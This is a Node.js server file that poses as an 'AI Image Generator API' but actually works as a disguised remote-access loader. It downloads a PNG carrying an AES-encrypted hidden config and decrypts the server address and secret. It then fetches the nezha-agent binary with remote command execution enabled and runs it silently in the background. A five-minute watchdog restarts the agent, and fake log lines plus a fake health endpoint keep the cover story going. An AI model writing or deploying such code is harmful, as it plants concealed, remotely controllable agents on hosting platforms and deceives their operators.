const http = require('http');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const { readdirSync, readFileSync, existsSync, mkdirSync, rmSync, unlinkSync, chmodSync, writeFileSync } = fs;
const { spawn, execSync } = require('child_process');
const path = require('path');

// 日志根目录
const BASEDIR = path.join(process.cwd(), 'logs');
// 端口优先级：SERVER_PORT > PORT(平台默认3000) > 兜底4567
const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;

// 初始化日志文件夹
ensureDir(BASEDIR);

// 需要保活的进程列表
const processList = ["nezha-agent"];

// --------------------------密钥修复核心改动--------------------------
// 从平台加密环境变量读取密钥，禁止硬编码
const CRYPTO_KEY = process.env.CRYPTO_KEY || "";
if (!CRYPTO_KEY) {
    console.error("【致命错误】未配置环境变量 CRYPTO_KEY，程序无法启动，请在SnapDeploy面板添加该环境变量！");
    process.exit(1);
}
// -------------------------------------------------------------------

/**
 * 带302重定向处理的文本下载
 * @param {string} url 目标地址
 * @returns {Promise<string>}
 */
function fetchText(url) {
    return new Promise((resolve, reject) => {
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                // 处理跳转
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    return request(res.headers.location);
                }
                if (res.statusCode !== 200) return reject(new Error(`HTTP Status: ${res.statusCode}`));

                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => resolve(data));
            }).on('error', () => reject(new Error("Network request failed")));
        };
        request(url);
    });
}

/**
 * 带重定向的文件下载
 * @param {string} url 下载地址
 * @param {string} destPath 本地保存路径
 * @returns {Promise<boolean>}
 */
function fetchFile(url, destPath) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(destPath);
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    return request(res.headers.location);
                }
                if (res.statusCode !== 200) {
                    unlinkSync(destPath);
                    return reject(new Error(`Download failed, code:${res.statusCode}`));
                }
                res.pipe(file);
                file.on('finish', () => file.close(() => resolve(true)));
            }).on('error', () => {
                unlinkSync(destPath);
                reject(new Error("File download error"));
            });
        };
        request(url);
    });
}

/**
 * 获取服务器公网IP，失败则读取内网IPv4
 */
async function getServerIP() {
    try {
        return await fetchText('https://api.ipify.org');
    } catch (e) {
        const nets = os.networkInterfaces();
        for (const name of Object.keys(nets)) {
            for (const net of nets[name]) {
                if (net.family === 'IPv4' && !net.internal) {
                    return net.address;
                }
            }
        }
        return '127.0.0.1';
    }
}

/**
 * 根据IP生成标准化UUID（MD5分段）
 * @param {string} ip
 * @returns {string} uuid
 */
function generateUUID(ip) {
    const hash = crypto.createHash('md5').update(ip).digest('hex');
    return `${hash.substring(0,8)}-${hash.substring(8,12)}-${hash.substring(12,16)}-${hash.substring(16,20)}-${hash.substring(20,32)}`;
}

/**
 * 解析图片内加密NZ配置块
 * @param {string} imagePath 图片路径
 * @returns {string|null} 解密后的配置文本
 */
function parseImageMetadata(imagePath) {
    try {
        const buffer = readFileSync(imagePath);
        const startMarker = Buffer.from('==NZ_CONFIG_START==');
        const endMarker = Buffer.from('==NZ_CONFIG_END==');

        const startPos = buffer.indexOf(startMarker);
        if (startPos === -1) return null;

        const endPos = buffer.indexOf(endMarker, startPos);
        if (endPos === -1) return null;

        const payloadStr = buffer.slice(startPos + startMarker.length, endPos).toString('utf-8').trim();
        const parts = payloadStr.split(':');
        const iv = Buffer.from(parts.shift(), 'hex');
        const encrypted = Buffer.from(parts.join(':'), 'hex');

        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(CRYPTO_KEY), iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        return null;
    }
}

/**
 * 提取配置文本中的 NZ_SERVER / NZ_TLS / NZ_SECRET
 * @param {string} text
 * @returns {Object} env
 */
function parseEnv(text) {
    const env = {};
    const regex = /(?:export\s+)?(NZ_SERVER|NZ_TLS|NZ_SECRET)\s*=\s*['"]([^'"]+)['"]/g;
    let match;
    while ((match = regex.exec(text)) !== null) {
        env[match[1]] = match[2];
    }
    return env;
}

/**
 * 下载并启动哪吒Agent
 */
async function startNezhaAgent() {
    try {
        console.log("Initializing image generation engine...");
        const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
        const localImagePath = '/tmp/dknz.png';

        // 下载带配置的图片
        await fetchFile(imageUrl, localImagePath);
        const decryptedText = parseImageMetadata(localImagePath);
        if (!decryptedText) return;

        const nezhaConfig = parseEnv(decryptedText);
        const ip = await getServerIP();
        const uuid = generateUUID(ip);

        const agentDir = '/tmp/agent_dir';
        const agentBin = path.join(agentDir, 'nezha-agent');
        const configPath = path.join(agentDir, 'config.yml');

        // 不存在二进制则下载解压
        if (!existsSync(agentBin)) {
            const archMap = { 'x64': 'amd64', 'arm64': 'arm64', 'arm': 'armv7' };
            const arch = archMap[process.arch] || 'amd64';
            const downloadUrl = `https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;

            await fetchFile(downloadUrl, '/tmp/agent.zip');
            if (existsSync(agentDir)) rmSync(agentDir, { recursive: true, force: true });
            mkdirSync(agentDir, { recursive: true });

            // 多方案解压兼容
            try {
                execSync(`unzip -o /tmp/agent.zip -d ${agentDir}`, { stdio: 'ignore' });
            } catch (e) {
                try {
                    execSync(`python3 -c "import zipfile; zipfile.ZipFile('/tmp/agent.zip').extractall('${agentDir}')"`, { stdio: 'ignore' });
                } catch (e2) {
                    try {
                        execSync(`python -c "import zipfile; zipfile.ZipFile('/tmp/agent.zip').extractall('${agentDir}')"`, { stdio: 'ignore' });
                    } catch (e3) {
                        return;
                    }
                }
            }
            chmodSync(agentBin, 0o755);
        }

        // 生成agent配置文件
        const tlsEnabled = nezhaConfig.NZ_TLS === 'true' || nezhaConfig.NZ_TLS === '1';
        const configContent = `server: '${nezhaConfig.NZ_SERVER}'
client_secret: '${nezhaConfig.NZ_SECRET}'
client_id: '${uuid}'
tls: ${tlsEnabled}
report_delay: 4
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
skip_connection_count: false
skip_procs_count: true
temperature: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: '${uuid}'
`;
        writeFileSync(configPath, configContent);

        // 后台启动agent，不占用输出
        const child = spawn(agentBin, ['-c', configPath], {
            env: { ...process.env, UUID: uuid, NZ_CLIENT_ID: uuid, NZ_REPORT_DELAY: '4' },
            stdio: "ignore"
        });

        child.on('spawn', () => {
            console.log("Rendering templates...");
            console.log("OK");
            console.log("Image generation service started successfully.");
        });
    } catch (err) {
        // 静默失败，不抛出
    }
}

/**
 * 遍历/proc获取所有运行进程
 */
function listRunningCommands() {
    return readdirSync('/proc')
        .filter(name => /^\d+$/.test(name))
        .map(pid => {
            try {
                return { pid, cmdline: readFileSync(`/proc/${pid}/cmdline`, 'utf-8') };
            } catch {
                return null;
            }
        })
        .filter(Boolean);
}

/**
 * 进程保活检测：不存在nezha-agent则重启
 */
async function monitorProcesses() {
    const running = listRunningCommands();
    const needRestart = processList.every(keyword =>
        !running.some(proc => proc.cmdline.includes(keyword))
    );
    if (needRestart) await startNezhaAgent();
}

// 定时调度器：5分钟检测一次进程
const Scheduler = {
    intervalMinutes: 5,
    active: true,
    async loop() {
        if (!this.active) return;
        await monitorProcesses();
        setTimeout(() => this.loop(), this.intervalMinutes * 60 * 1000);
    }
};

// HTTP健康接口服务
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
        status: "online",
        service: "AI Image Generator API",
        version: "2.4.1",
        endpoints: ["/api/v1/render", "/api/v1/status"]
    }));
}).listen(PORT, () => {
    console.log(`Service listen on port ${PORT}`);
    // 2秒后启动进程监控循环
    setTimeout(() => Scheduler.loop(), 2000);
});

/**
 * 递归创建文件夹
 * @param {string} p 路径
 */
function ensureDir(p) {
    if (!existsSync(p)) mkdirSync(p, { recursive: true });
}
